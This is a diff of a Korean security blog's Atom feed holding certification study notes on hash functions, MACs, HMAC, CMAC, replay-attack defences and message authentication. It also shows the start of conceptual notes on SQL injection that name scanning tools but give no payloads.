+                  &lt;li&gt;수신자가 받은 메시지가 송신자가 보낸 메시지와 동일한 것인지 확인하는 것&lt;/li&gt;
+                  &lt;li&gt;메시지 내용 변경, 순서 변경, 삭제 및 훼손 등 불법 행위에 대하여 확인하는 기술&lt;/li&gt;
+                  &lt;li&gt;관용 암호화 방식, 공개키 암호화 방식, 해시 함수, MAC 을 이용하는 방식 등&lt;/li&gt;
+                &lt;/ul&gt;
+              &lt;/li&gt;
+              &lt;li&gt;메시지 인증 방법
+                &lt;ul&gt;
+                  &lt;li&gt;관용(대칭키) 암호방식을 이용한 메시지 인증 방식
+                    &lt;ul&gt;
+                      &lt;li&gt;평문을 사전에 분배해서 갖고 있던 비밀키로 암호화하여 암호문을 수신자에게 전송하면 수신자는 암호문을 비밀키로 복호화하여 확인&lt;/li&gt;
+                      &lt;li&gt;이 때, 평문이 문장으로 되어 있으면 복호화 후 전송 중의 메시지 변경 여부를 확인할 수 있음&lt;/li&gt;
+                    &lt;/ul&gt;
+                  &lt;/li&gt;
+                  &lt;li&gt;공개키 암호화 방식을 이용한 메시지 인증 방식
+                    &lt;ul&gt;
+                      &lt;li&gt;송신자는 자신의 개인키로 평문을 암호화하여 암호문을 수신자에게 전송, 수신자는 송신자의 공개키로 암호문을 복호화하여 인증을 확인&lt;/li&gt;
+                      &lt;li&gt;누구나 메시지 인증을 검증할 수 있음. 개인키를 알고 있는 송신자만 인증을 생성할 수 있기 때문에 제 3자가 송신자를 가장하여 메시지를 전송할 수 없음.&lt;/li&gt;
+                    &lt;/ul&gt;
+                  &lt;/li&gt;
+                  &lt;li&gt;해시 함수를 이용한 메시지 인증 방식
+                    &lt;ul&gt;
+                      &lt;li&gt;메시지로부터 해시 함수 결과 값을 계산한 후 수신한 해시 값과 비교하여 메시지의 무결성을 검증하는 방식&lt;/li&gt;
+                      &lt;li&gt;해시 함수가 공개되어 있기 때문에 제 3자가 인증자인 것처럼 가장하여 임의의 메시지를 정당한 메시지인 것처럼 인증하면 수신자는 제 3자의 위조 인증임을 알 수 없음&lt;/li&gt;
+                      &lt;li&gt;비밀정보를 해시 함수에 추가하여 계산하여 단점을 해결. 송수신자는 사전에 비밀정보를 가지고 있다가 인증하려는 메시지와 비밀정보를 연계하여 해시 함수에 인증하고 계산한 값을 메시지에 덧붙여 전송함.&lt;/li&gt;
+                      &lt;li&gt;수신자는 사용자로부터 수신한 메시지와 자신이 보관하고 있는 비밀 정보로 해시함수를 계산한 후 수신한 해시 함수 결과 값과 비교하여 메시지 인증을 수행. 제3자는 비밀정보를 모름.&lt;/li&gt;
+                    &lt;/ul&gt;
+                  &lt;/li&gt;
+                  &lt;li&gt;MAC 을 이용한 메시지 인증 방식
+                    &lt;ul&gt;
+                      &lt;li&gt;MAC (Message Authentication Code) 은 관용 암호방식을 이용하여 간단한 무결성 검증 코드를 만들어 메시지에 부가시키는 방법&lt;/li&gt;
+                      &lt;li&gt;MAC 을 이용해 메시지 인증 및 무결성 검사를 수행하는 절차로는 우선 송신자가 인증할 메시지를 비밀키로 암호화시킨 MAC 값을 계산한 후 메시지와 함께 수신자에게 전송.&lt;/li&gt;
+                    &lt;/ul&gt;
+                  &lt;/li&gt;
+                &lt;/ul&gt;
+              &lt;/li&gt;
+            &lt;/ul&gt;
+          &lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;</content><author><name>HY03</name><email>hyunik03@gmail.com</email></author><category term="IS_Certification" /><category term="정보보안기사" /><category term="해시함수" /><summary type="html">해시함수 해시함수 일방향 해시함수 일방향 해시함수의 개요 기본개념 일방향 해시함수(one-way hash function) 에는 입력과 출력이 각각 1개씩 있음 입력은 메시지(message) - 임의의 길이, 출력은 해시값(hash value) - 고정된 길이 일방향 해시함수의 성질 임의 길이의 메시지로부터 고정 길이의 해시값을 계산 해시값을 고속으로 계산 일방향성을 가짐. (해시값으로부터 메시지를 역산할 수 없음) 메시지가 다르면 해시값도 다름. (무결성 확인용) 메시지가 1비트라도 변하면 해시값은 매우 높은 확률로 다른 값이 되야 함. 2개의 다른 메시지가 같은 해시값을 갖는 것을 충돌(collision) 이라고 함. 충돌이 발생하는 것이 어려운 성질 =&amp;gt; 충돌 내성 (collision resistance) 해시 함수 = 메시지 다이제스트 함수 = 메시지 요약함수 무결성 = 완전성 = 보전성 메시지 무결성 무결성 점검 무결성 점검을 위해 암호학적 해시함수 사용 생성된 메시지 다이제스트와 이전 메시지 다이제스트를 비교 두 개가 동일하면 원래 메시지가 변경되지 않음 암호학적 해시함수 기준 개요 (암호학적 해시함수는 다음을 충족해야 함) 프리이미지 저항성 (preimage resistance) : 역상 저항성 해시함수 h 와 y=h(M) 에 대하여 Eve 가 이를 만족하는 M 값을 찾아내는게 힘들어야 함 y = h(x) 를 만족하는 x 를 찾는 것이 불가능해야 함. 제2프리이미지 저항성 (second preimage resistance) : 두 번째 역상 저항성, 약한 충돌 내성 메시지를 쉽게 위조할 수 없도록 하는 성질 Eve가 메시지와 다이제스트를 가로채고 또 다른 다이제스트를 생성 입력값 x에 대해서 h(x) = h(x’), x != x’ 을 만족하는 x’ 을 찾는 것이 불가능해야 함. 충돌 저항성 (collision resistance) : 강한 충돌 내성 약한 충돌 내성보다 확률이 높음 Eve 로 하여금 동일한 다이제스트를 가지는 2개의 메시지를 구하지 못하도록 하는 것 h(x) = h(x’) 을 만족하는 입력값 x, x’ 을 찾는다는 것은 계산적으로 불가능해야 함. 일방향 해시함수의 응용 소프트웨어 변경 검출 무결성 검증 패스워드를 기초로 한 암호화 패스워드와 솔트(의사난수 랜덤 값)를 섞은 결과의 해시값을 구해 그것을 암호화키로 사용 =&amp;gt; 사전 공격 차단 메시지 인증코드 송신자와 수신자만의 키와 메시지를 혼합하여 해시값을 계산 한 것 SSL/TLS 에서도 사용 전자서명 전자입찰 시스템 랜덤 오라클 모델과 해시함수에 대한 공격 랜덤 오라클 모델 개요 해시함수에 대한 이상적인 수학적 모델 비둘기집 원리 n+1 비들기가 n개의 집에 들어가 있을 때 한 비둘기 집에는 두마리가 있다는 원리 (충돌을 의미) 생일 문제 (생일 공격) 같은 해시값을 생성하는 2개의 메시지를 구하는 것 강한 충돌 내성을 깨고자 하는 공격 생일 패러독스 (birthday paradox) -&amp;gt; 일치할 확률이 상상 이상으로 높아지는 것 랜덤으로 선택한 N명의 그룹, N 명 중 적어도 2명의 생일이 일치할 확률이 1/2 이상이 되도록 하기 위한 N은 최저 몇 명? -&amp;gt; 23명 N명 전원 생일이 일치하지 않을 확률을 1에서 빼면 됨. 일방향 해시함수에 대한 공격 무차별 공격 약한 충돌 내성을 깨고자 하는 공격 SHA-1 은 160 비트라서 2의 160승 회를 시행하면 됨 기타 해시함수 공격의 종류 및 특성 일치블록 연쇄공격 : 새로운 메시지 M’ 을 사전에 다양하게 만들어 놓았다가 공격하고자 하는 메시지의 해시함수값 h(M) 과 같은 해시함수값을 갖는 것을 골라 사용하는 공격 중간자 연쇄공격 : 전체 해시 값이 아니라 해시 중간의 결과에 대한 충돌쌍을 찾는다. 고정점 연쇄공격 : 메시지 블록과 연쇄변수 쌍을 얻게 되면 임의의 수의 동등한 블록들 xi 를 메시지의 중간에 삽입해도 전체 해시값이 변하지 않는다. 차분 연쇄공격 다중 라운드 블록암호의 공격 = 다중 라운드 블록암호를 사용하는 해시 함수에서 입력값과 그에 대응하는 출력값 차이의 통계적 특성을 조사하는 기법 해시함수의 공격 : 압축함수의 입출력 차이를 조사하여 0의 충돌쌍을 주로 찾아내는 방법을 사용 일방향 해시함수로 해결할 수 없는 문제 조작과 변경을 검출할 수 있지만 거짓행세를 검출하지는 못함 무결성 외에 인증이라는 절차도 필요 (파일의 무결성 뿐만 아니라 파일의 송신처 검증도 필요) 인증을 하기 위한 기술 : 메시지 인증코드와 전자서명과 같은 기술 암호학적 해시함수의 예 개요 압축함수의 두 가지 유형 기본 개념 해시 함수를 설계하는 데에는 크게 서로 다른 2가지 경향이 있음. 압축함수를 아무런 기초 없이 처음부터 새로 만드는 것, 목적에 맞추어 특별하게 설계. 압축함수 자리에 대칭키 블록 암호를 사용하는 것. 새로 만드는 해시함수 메시지 다이제스트 (Message Digest) (MD2 -&amp;gt; MD4 -&amp;gt; MD5) MD 알고리즘에는 MD2, MD4, MD5 세 가지가 있음. RSA를 개발한 MIT의 Rivest 교수가 공개키 기반 구조를 만들기 위해 RSA 와 함께 개발 1989년에 만들어진 MD2는 8비트 컴퓨터에 최적화, MD4(90년 개발), MD5(91년 개발) 은 32비트 컴퓨터에 최적화 MD5 는 MD4의 확장판으로, MD4 보다 속도는 빠르지 않지만 데이터 보안성이 더 좋음. 최종 버전인 MD5 : 메시지를 512비트로 된 블록들로 나누고, 128비트 다이제스트를 출력. 충돌 공격 내성을 갖기에는 길이가 짧음. SHA (Secure Hash Algorithm) 안전 해시 알고리즘(SHA), 최근에 널리 사용 NIST가 개발, 1993년에 FIPS PUB 180 으로 출판. SHA의 약점이 발견되었을 때 1995년 FIPS PUB 180-1로 나옴, 이를 SHA-1 이라고 함. SHA 는 MD4 해시함수에 기초, 설계도 MD4 를 모델로 함. MD5 보다 느리지만 안전함. SHA-1 해시값으로 160비트를 출력. 2002년 NIST는 새 표준인 FIPS-180-2를 내놓음. 해시 값이 각각 256, 384와 512비트인 3개의 새로운 SHA 버전을 정의함. SHA-256, SHA-384, SHA-512. 이들 알고리즘을 SHA-2 라고 함. 새로운 버전은 SHA-1과 하부구조가 동일. 동일한 유형의 모듈러 연산과 논리적 2진 연산을 이용. 2008년 FIP PUB 180-3 에는 224-비트 버전이 추가. 2005년에 SHA-1의 강한 충돌 내성이 깨졌다는 것을 접수하고 SHA-3을 제정하기로 함. SHA-3 은 AES와 같은 방식으로 표준화 SHA-512 개요 기본개념 SHA-2에 포함 (SHA-224, SHA-256, SHA-384, SHA-512) SHA-512는 다중-블록 메시지로부터 512비트 다이제스트를 생성함. 각 블록은 1024비트 길이를 가짐. 길이 필드와 패딩 메시지 다이제스트를 생성하기 전에 메시지에 추가적으로 덧붙이는 128비트의 부호 없는 정수 길이 필드가 필요. (512의 경우) Original MSG Field (&amp;lt;2^128) Padding Field (가변길이) Length Field (Original MSG 길이필드 - Hash 값 수정에 대한 방어체계) 메시지의 길이가 비트수로 표현된 값이 저장됨. 이 길이는 패딩을 하기 전의 원래 메시지 길이를 나타냄. 부호 없는 128비트 정수 필드로 정의할 수 있는 수는 0부터 2^128-1 이다. 이 길이가 바로 SHA-512에서 감당할 수 있는 최대 메시지 길이. 2^128 비트 이하의 길이를 갖는 메시지를 1024비트의 블록으로 쪼갬. IV 512 bit 와 블록을 Compression 함수를 이용해 512 bit 생성 위의 512bit 데이터를 다음 블록과 Compression 함수를 이용해 512 bit 생성… 메시지 인증코드(MAC) MAC의 개요 기본개념 메시지 인증을 위해 필요 (MAC, Message Authentication Code) 해시함수 기반, 블록암호 = 전자서명보다 속도가 빠름 무결성을 확인하고, 메시지에 대한 인증을 하는 기술 (변경과 거짓행세 검출 가능) 임의 길이의 메시지와 송신자 및 수신자가 공유하는 키라는 2개의 입력값을 기초로 해서 고정 비트길이의 출력을 계산하는 함수, 이 출력을 MAC 값이라고 부름. Msg 와 키(송신자,수신자 공유)를 MAC 함수에 입력하여 MAC 값(고정길이 비트)을 추출 메시지 인증 암호를 사용하면 소극적 공격(도청)을, 인증을 사용하면 적극적 공격(데이터나 거래의 위조)를 방어할 수 있음. 변경 감지 코드 (MDC, Modification Detection Code) 메시지의 무결성을 보장하는 메시지 다이제스트 Bob은 수신한 메시지로부터 새로운 MDC 를 생성하여 Alice 에게 받은 MDC 와 비교, 값이 동일하다면 해당 메시지는 변경되지 않음. 키가 없는 해시함수를 사용 메시지 인증 코드 (MAC) 메시지의 무결성은 물론 Alice 가 메시지의 원 전송자이며 다른 사람이 Alice 인 척 하는 것이 아니라는 것을 말해주는 데이터 출원지 인증을 보장하기 위해, 변경 감지 코드를 메시지 인증코드(MAC) 로 바꿀 필요가 있음. MDC와 MAC의 차이는 MAC 에는 Alice 와 Bob 사이의 비밀값이 포함. Eve 는 가지고 있지 않은 비밀키가 두 사람 사이의 비밀 값이 될 수 있다. Eve 가 변조를 하더라도, 메시지와 키 값의 Hash 값인 MAC 값을 생성할 수 없음. MAC 의 키 배송 문제 MAC에서는 송신자와 수신자가 키를 공유할 필요가 있다. 대칭키 암호 때의 키 배송 문제와 같은 문제가 메시지 인증코드에서도 일어남. MAC의 구현 사례 축소 MAC MAC의 안정성을 높이기 위해 축소 MAC(nested MAC) 이 설계됨. 두 단계의 해싱이 있음 첫 번째 단계 : 키는 메시지와 이어 붙이고 해시하여 중간 단계의 다이제스트를 생성함. 두 번째 단계 : 키는 중간단계 다이제스트에 이어 붙이고 최종적인 다이제스트를 생성 HMAC 축소 MAC 보다 더 복잡. 패딩 같은 추가적인 조치가 더 들어 있음. HMAC 은 일방향 해시함수를 이용하여 메시지 인증코드를 구성하는 방법. HMAC 의 H 는 Hash 블록길이 SHA-1 : 512 SHA-2 (SHA-224 : 512, SHA-256 : 512, SHA-384 : 1024, SHA-512 : 1024) MD 길이 SHA-1 : 160 SHA-2 (SHA-224 : 224, SHA-256 : 256, SHA-384 : 384, SHA-512 : 512) HMAC 과정 키값 : 키 Key Padding (000..) 으로 블록길이만큼 늘임 XOR 연산 I Pad : 00110110 00110110 00110110 … 으로 블록길이만큼 늘임 결과값 Si 와 메시지블록 M1, M2, … , Mn 을 결합하여 해시함수(H) 적용 (결과값 h) 위 키값과 O Pad : 01011100 01011100 01011100 … 으로 블록길이만큼 늘린 값을 XOR 연산 결과값 So 와 h 를 결합 (So h) 하여 해시함수(H) 적용, 최종 MAC 값 추출 H : SHA-1, MD5 등등… CMAC (Cipher-based Message Authentication Code) NIST 는 데이터 인증 알고리즘 혹은 CMAC 또는 CBCMAC 이라 부르는 표준 FIPS 113을 정의 대칭키 암호시스템에 대한 암호 블록체인 (CBC) 모드와 유사한 방법 그러나 N개의 평문 블록으로부터 N개의 암호문 블록을 만드는 것은 아님. (1개의 암호문 블록 생성) CMAC 이 CBCMAC 보다 안전 (수학적 보완) 과정 메시지 블록 M1, M2, …, Mn M1 과 k (키값) 을 E (Encrypt) 한 결과 R1 M2 와 R1 을 Xor 연산 하여 k (키값) 을 E (Encrypt) … Mn 와 Rn-1 와 새로 생성한 k (키값) 을 E (Encrypt) =&amp;gt; CMAC MAC 의 이용 예 IPSec (HMAC) 인터넷 기반 통신프로토콜 IP(Internet Protocol) 에 보안기능을 추가한 것 통신 내용의 인증과 무결성을 확인하기 위해 MAC 을 이용 SSL/TLS (HMAC) 웹에서 온라인 쇼핑을 할 때 사용되는 통신 프로토콜 통신 내용의 인증과 무결성 확인을 위해 메시지 인증코드를 이용 SET 프로토콜 (HMAC) MAC 에 대한 공격 재전송 공격 개요 적극적 공격자 멜로리는 자신이 보존해 둔 MAC 값을 반복해서 송신하는 공격을 감행. 이를 재전송 공격(replay attack) 이라고 부름 A 에서 B로 전송되는 Msg + MAC 을 Mellory 가 확보 Msg + MAC 을 재전송 재전송 공격을 막을 수 있는 방법에는 아래 4가지가 있음. 순서 번호 (sequence number) 송신 메시지에 매회 1회씩 증가하는 번호를 붙이기로 약속. MAC 값의 계산에 순서번호도 메시지에 포함시키도록 함. 마지막 순서 번호를 기록해야 함. 타임스탬프 (timestamp) 송신 메시지에 현재 시각을 넣기로 약속해두고 그 이전의 메시지가 왔을 경우에는 MAC 값이 바르더라도 오류라고 판단. 시계 동기화 필요 비표 (nonce) 메시지를 수신하기에 앞서 수신자는 송신자에게 일회용의 랜덤한 값 (비표) 를 줌. 송신자는 비표를 포함해서 MAC 값을 계산, 비표의 값은 통신 때마다 바뀜. 통신 데이터 양이 약간 증가 시도/응답 (challenge/response) 비표와 유사 개념 상대방에게 난수값을 보내면 상대방은 난수값을 포함한 응답값을 보내야 함. MAC으로 해결할 수 없는 문제 제 3자에 대한 증명 MAC 은 공유키를 사용하기에 MAC 값을 계산할 수 있는 것은 Alice 와 Bob 이다. 두 사람이 서로 통신하고 있는 동안 그 MAC 값을 계산한 것은 상대방이라고 말할 수 있다. 하지만 제3자 Victor 에게 이 MAC 값을 계산한 것은 자신이 아닌 상대방이라고 증명할 방법은 없다. 전자서명을 사용하면 제3자에 대한 증명이 가능해짐 부인 방지 송신자 Alice 는 Bob 에게 그러한 메시지를 보내지 않았다고 Victor 에게 주장할 수 있고 이를 부인이라고 한다. MAC 에서는 Alice 와 Bob 중 어느 쪽 주장이 맞는지를 판단할 수 없다. 전자서명을 사용하면 부인방지가 가능함 메시지 인증 개요 기본 개념 수신자가 받은 메시지가 송신자가 보낸 메시지와 동일한 것인지 확인하는 것 메시지 내용 변경, 순서 변경, 삭제 및 훼손 등 불법 행위에 대하여 확인하는 기술 관용 암호화 방식, 공개키 암호화 방식, 해시 함수, MAC 을 이용하는 방식 등 메시지 인증 방법 관용(대칭키) 암호방식을 이용한 메시지 인증 방식 평문을 사전에 분배해서 갖고 있던 비밀키로 암호화하여 암호문을 수신자에게 전송하면 수신자는 암호문을 비밀키로 복호화하여 확인 이 때, 평문이 문장으로 되어 있으면 복호화 후 전송 중의 메시지 변경 여부를 확인할 수 있음 공개키 암호화 방식을 이용한 메시지 인증 방식 송신자는 자신의 개인키로 평문을 암호화하여 암호문을 수신자에게 전송, 수신자는 송신자의 공개키로 암호문을 복호화하여 인증을 확인 누구나 메시지 인증을 검증할 수 있음. 개인키를 알고 있는 송신자만 인증을 생성할 수 있기 때문에 제 3자가 송신자를 가장하여 메시지를 전송할 수 없음. 해시 함수를 이용한 메시지 인증 방식 메시지로부터 해시 함수 결과 값을 계산한 후 수신한 해시 값과 비교하여 메시지의 무결성을 검증하는 방식 해시 함수가 공개되어 있기 때문에 제 3자가 인증자인 것처럼 가장하여 임의의 메시지를 정당한 메시지인 것처럼 인증하면 수신자는 제 3자의 위조 인증임을 알 수 없음 비밀정보를 해시 함수에 추가하여 계산하여 단점을 해결. 송수신자는 사전에 비밀정보를 가지고 있다가 인증하려는 메시지와 비밀정보를 연계하여 해시 함수에 인증하고 계산한 값을 메시지에 덧붙여 전송함. 수신자는 사용자로부터 수신한 메시지와 자신이 보관하고 있는 비밀 정보로 해시함수를 계산한 후 수신한 해시 함수 결과 값과 비교하여 메시지 인증을 수행. 제3자는 비밀정보를 모름. MAC 을 이용한 메시지 인증 방식 MAC (Message Authentication Code) 은 관용 암호방식을 이용하여 간단한 무결성 검증 코드를 만들어 메시지에 부가시키는 방법 MAC 을 이용해 메시지 인증 및 무결성 검사를 수행하는 절차로는 우선 송신자가 인증할 메시지를 비밀키로 암호화시킨 MAC 값을 계산한 후 메시지와 함께 수신자에게 전송.</summary></entry><entry><title type="html">정보보안 - 비대칭키 암호</title><link href="https://bluesplatter.com/is_certification/IS-Management-AsymmetricKeyAlgorithm/" rel="alternate" type="text/html" title="정보보안 - 비대칭키 암호" /><published>2021-08-25T09:00:00+09:00</published><updated>2021-08-25T09:00:00+09:00</updated><id>https://bluesplatter.com/is_certification/IS-Management-AsymmetricKeyAlgorithm</id><content type="html" xml:base="https://bluesplatter.com/is_certification/IS-Management-AsymmetricKeyAlgorithm/">&lt;h1 id=&quot;비대칭키-암호&quot;&gt;비대칭키 암호&lt;/h1&gt;
 &lt;ul&gt;
   &lt;li&gt;키 배송 문제
     &lt;ul&gt;
@@ -402,127 +903,6 @@
           &lt;li&gt;공개키 암호의 처리 속도가 느린 것을 대칭키 암호로 해결, 대칭키 암호의 키 배송 문제를 공개키 암호로 해결&lt;/li&gt;
           &lt;li&gt;유명한 암호 소프트웨어인 PGP 와 Web의 암호통신에 사용되고 있는 SSL/TLS 에서도 하이브리드 암호시스템 사용&lt;/li&gt;
           &lt;li&gt;PGP의 처리에서는 하이브리드 암호시스템에 디지털서명, 디지털서명의 검증, 개인키의 관리도 추가하여 사용됨.&lt;/li&gt;
-        &lt;/ul&gt;
-      &lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-  &lt;li&gt;해시함수
-    &lt;ul&gt;
-      &lt;li&gt;일방향 해시함수
-        &lt;ul&gt;
-          &lt;li&gt;일방향 해시함수의 개요
-            &lt;ul&gt;
-              &lt;li&gt;기본개념
-                &lt;ul&gt;
-                  &lt;li&gt;일방향 해시함수(one-way hash function) 에는 입력과 출력이 각각 1개씩 있음&lt;/li&gt;
-                  &lt;li&gt;입력은 메시지(message) - 임의의 길이, 출력은 해시값(hash value) - 고정된 길이&lt;/li&gt;
-                &lt;/ul&gt;
-              &lt;/li&gt;
-            &lt;/ul&gt;
-          &lt;/li&gt;
-          &lt;li&gt;일방향 해시함수의 성질
-            &lt;ul&gt;
-              &lt;li&gt;임의 길이의 메시지로부터 고정 길이의 해시값을 계산&lt;/li&gt;
-              &lt;li&gt;해시값을 고속으로 계산&lt;/li&gt;
-              &lt;li&gt;일방향성을 가짐. (해시값으로부터 메시지를 역산할 수 없음)&lt;/li&gt;
-              &lt;li&gt;메시지가 다르면 해시값도 다름. (무결성 확인용)
-                &lt;ul&gt;
-                  &lt;li&gt;메시지가 1비트라도 변하면 해시값은 매우 높은 확률로 다른 값이 되야 함.&lt;/li&gt;
-                  &lt;li&gt;2개의 다른 메시지가 같은 해시값을 갖는 것을 충돌(collision) 이라고 함.&lt;/li&gt;
-                &lt;/ul&gt;
-              &lt;/li&gt;
-              &lt;li&gt;충돌이 발생하는 것이 어려운 성질 =&amp;gt; 충돌 내성 (collision resistance)&lt;/li&gt;
-              &lt;li&gt;해시 함수 = 메시지 다이제스트 함수 = 메시지 요약함수&lt;/li&gt;
-              &lt;li&gt;무결성 = 완전성 = 보전성&lt;/li&gt;
-            &lt;/ul&gt;
-          &lt;/li&gt;
-        &lt;/ul&gt;
-      &lt;/li&gt;
-      &lt;li&gt;메시지 무결성
-        &lt;ul&gt;
-          &lt;li&gt;무결성 점검
-            &lt;ul&gt;
-              &lt;li&gt;무결성 점검을 위해 암호학적 해시함수 사용&lt;/li&gt;
-              &lt;li&gt;생성된 메시지 다이제스트와 이전 메시지 다이제스트를 비교&lt;/li&gt;
-              &lt;li&gt;두 개가 동일하면 원래 메시지가 변경되지 않음&lt;/li&gt;
-            &lt;/ul&gt;
-          &lt;/li&gt;
-          &lt;li&gt;암호학적 해시함수 기준
-            &lt;ul&gt;
-              &lt;li&gt;개요 (암호학적 해시함수는 다음을 충족해야 함)
-                &lt;ul&gt;
-                  &lt;li&gt;프리이미지 저항성 (preimage resistance) : &lt;strong&gt;역상 저항성&lt;/strong&gt;
-                    &lt;ul&gt;
-                      &lt;li&gt;해시함수 h 와 y=h(M) 에 대하여 Eve 가 이를 만족하는 M 값을 찾아내는게 힘들어야 함&lt;/li&gt;
-                      &lt;li&gt;&lt;strong&gt;y = h(x) 를 만족하는 x 를 찾는 것이 불가능해야 함.&lt;/strong&gt;&lt;/li&gt;
-                    &lt;/ul&gt;
-                  &lt;/li&gt;
-                  &lt;li&gt;제2프리이미지 저항성 (second preimage resistance) : 두 번째 역상 저항성, &lt;strong&gt;약한 충돌 내성&lt;/strong&gt;
-                    &lt;ul&gt;
-                      &lt;li&gt;메시지를 쉽게 위조할 수 없도록 하는 성질&lt;/li&gt;
-                      &lt;li&gt;Eve가 메시지와 다이제스트를 가로채고 또 다른 다이제스트를 생성&lt;/li&gt;
-                      &lt;li&gt;&lt;strong&gt;입력값 x에 대해서 h(x) = h(x’), x != x’ 을 만족하는 x’ 을 찾는 것이 불가능해야 함.&lt;/strong&gt;&lt;/li&gt;
-                    &lt;/ul&gt;
-                  &lt;/li&gt;
-                  &lt;li&gt;충돌 저항성 (collision resistance) : &lt;strong&gt;강한 충돌 내성&lt;/strong&gt;
-                    &lt;ul&gt;
-                      &lt;li&gt;약한 충돌 내성보다 확률이 높음&lt;/li&gt;
-                      &lt;li&gt;Eve 로 하여금 동일한 다이제스트를 가지는 2개의 메시지를 구하지 못하도록 하는 것&lt;/li&gt;
-                      &lt;li&gt;&lt;strong&gt;h(x) = h(x’) 을 만족하는 입력값 x, x’ 을 찾는다는 것은 계산적으로 불가능해야 함.&lt;/strong&gt;&lt;/li&gt;
-                    &lt;/ul&gt;
-                  &lt;/li&gt;
-                &lt;/ul&gt;
-              &lt;/li&gt;
-            &lt;/ul&gt;
-          &lt;/li&gt;
-        &lt;/ul&gt;
-      &lt;/li&gt;
-      &lt;li&gt;일방향 해시함수의 응용
-        &lt;ul&gt;
-          &lt;li&gt;소프트웨어 변경 검출&lt;/li&gt;
-          &lt;li&gt;패스워드를 기초로 한 암호화
-            &lt;ul&gt;
-              &lt;li&gt;패스워드와 솔트(의사난수 랜덤 값)를 섞은 결과의 해시값을 구해 그것을 암호화키로 사용 =&amp;gt; 사전 공격 차단&lt;/li&gt;
-            &lt;/ul&gt;
-          &lt;/li&gt;
-          &lt;li&gt;메시지 인증코드
-            &lt;ul&gt;
-              &lt;li&gt;송신자와 수신자만의 키와 메시지를 혼합하여 해시값을 계산 한 것&lt;/li&gt;
-              &lt;li&gt;SSL/TLS 에서도 사용&lt;/li&gt;
-            &lt;/ul&gt;
-          &lt;/li&gt;
-          &lt;li&gt;전자서명&lt;/li&gt;
-          &lt;li&gt;전자입찰 시스템&lt;/li&gt;
-        &lt;/ul&gt;
-      &lt;/li&gt;
-      &lt;li&gt;랜덤 오라클 모델과 해시함수에 대한 공격
-        &lt;ul&gt;
-          &lt;li&gt;랜덤 오라클 모델
-            &lt;ul&gt;
-              &lt;li&gt;개요
-                &lt;ul&gt;
-                  &lt;li&gt;해시함수에 대한 이상적인 수학적 모델&lt;/li&gt;
-                &lt;/ul&gt;
-              &lt;/li&gt;
-              &lt;li&gt;비둘기집 원리
-                &lt;ul&gt;
-                  &lt;li&gt;n+1 비들기가 n개의 집에 들어가 있을 때 한 비둘기 집에는 두마리가 있다는 원리 (충돌을 의미)&lt;/li&gt;
-                &lt;/ul&gt;
-              &lt;/li&gt;
-              &lt;li&gt;생일 문제 (생일 공격)
-                &lt;ul&gt;
-                  &lt;li&gt;같은 해시값을 생성하는 2개의 메시지를 구하는 것&lt;/li&gt;
-                  &lt;li&gt;강한 충돌 내성을 깨고자 하는 공격&lt;/li&gt;
-                  &lt;li&gt;생일 패러독스 (birthday paradox) -&amp;gt; 일치할 확률이 상상 이상으로 높아지는 것&lt;/li&gt;
-                  &lt;li&gt;랜덤으로 선택한 N명의 그룹, N 명 중 적어도 2명의 생일이 일치할 확률이 1/2 이상이 되도록 하기 위한 N은 최저 몇 명? -&amp;gt; 23명
-                    &lt;ul&gt;
-                      &lt;li&gt;N명 전원 생일이 일치하지 않을 확률을 1에서 빼면 됨.&lt;/li&gt;
-                    &lt;/ul&gt;
-                  &lt;/li&gt;
-                &lt;/ul&gt;
-              &lt;/li&gt;
-            &lt;/ul&gt;
-          &lt;/li&gt;
         &lt;/ul&gt;
       &lt;/li&gt;
     &lt;/ul&gt;
@@ -3697,548 +4077,4 @@
       &lt;/li&gt;
     &lt;/ul&gt;
   &lt;/li&gt;
-&lt;/ul&gt;</content><author><name>HY03</name><email>hyunik03@gmail.com</email></author><category term="IS_Certification" /><category term="정보보안기사" /><category term="어플리케이션" /><summary type="html">XSS(Cross Site Script)</summary></entry><entry><title type="html">정보보안 - SQL Injection</title><link href="https://bluesplatter.com/is_certification/IS-Application-SQL_Injection/" rel="alternate" type="text/html" title="정보보안 - SQL Injection" /><published>2021-06-28T19:00:00+09:00</published><updated>2021-06-28T19:00:00+09:00</updated><id>https://bluesplatter.com/is_certification/IS-Application-SQL_Injection</id><content type="html" xml:base="https://bluesplatter.com/is_certification/IS-Application-SQL_Injection/">&lt;h1 id=&quot;sql-injection&quot;&gt;SQL Injection&lt;/h1&gt;
-
-&lt;h2 id=&quot;sql-injection-1&quot;&gt;SQL Injection&lt;/h2&gt;
-&lt;ul&gt;
-  &lt;li&gt;개요
-    &lt;ul&gt;
-      &lt;li&gt;코드 인젝션의 한 기법으로 클라이언트의 입력값을 조작하여 서버의 데이터베이스 공격
-        &lt;ul&gt;
-          &lt;li&gt;예) 웹페이지 로그인 폼의 ID/PW 입력란에 SQL 쿼리를 삽입&lt;/li&gt;
-        &lt;/ul&gt;
-      &lt;/li&gt;
-      &lt;li&gt;공격이 쉬운데 비해 파괴력이 강하기 때문에 시큐어코딩의 기본중 하나&lt;/li&gt;
-      &lt;li&gt;Injection 계열 취약점들은 테스트를 통한 발견은 어려우나 스캐닝툴이나 코드 검증절차를 거치면 보통 쉽게 발견되기 때문에 탐지하기 쉬운 편
-        &lt;ul&gt;
-          &lt;li&gt;스캐닝 툴
-            &lt;ul&gt;
-              &lt;li&gt;Nikto : GNU 오픈소스, 웹서버, Injection 등 취약점 점검&lt;/li&gt;
-              &lt;li&gt;SQLMap (Python) : 블라인드 SQL Injection 점검&lt;/li&gt;
-              &lt;li&gt;Absinthe : 블라인드 SQL Injection 점검&lt;/li&gt;
-            &lt;/ul&gt;
-          &lt;/li&gt;
-        &lt;/ul&gt;
-      &lt;/li&gt;
-      &lt;li&gt;입력 값 필터링이 제대로 이루어지지 않는 경우 발생&lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-  &lt;li&gt;Web Application 의 일반적인 인증 절차
-    &lt;ul&gt;
-      &lt;li&gt;ID/PW 입력&lt;/li&gt;
-      &lt;li&gt;SQL Query 생성&lt;/li&gt;
-      &lt;li&gt;Database 에 쿼리 전송&lt;/li&gt;
-      &lt;li&gt;Database 에서 쿼리 실행&lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-  &lt;li&gt;공격방식에 따른 분류
-    &lt;ul&gt;
-      &lt;li&gt;Form SQL Injection
-        &lt;ul&gt;
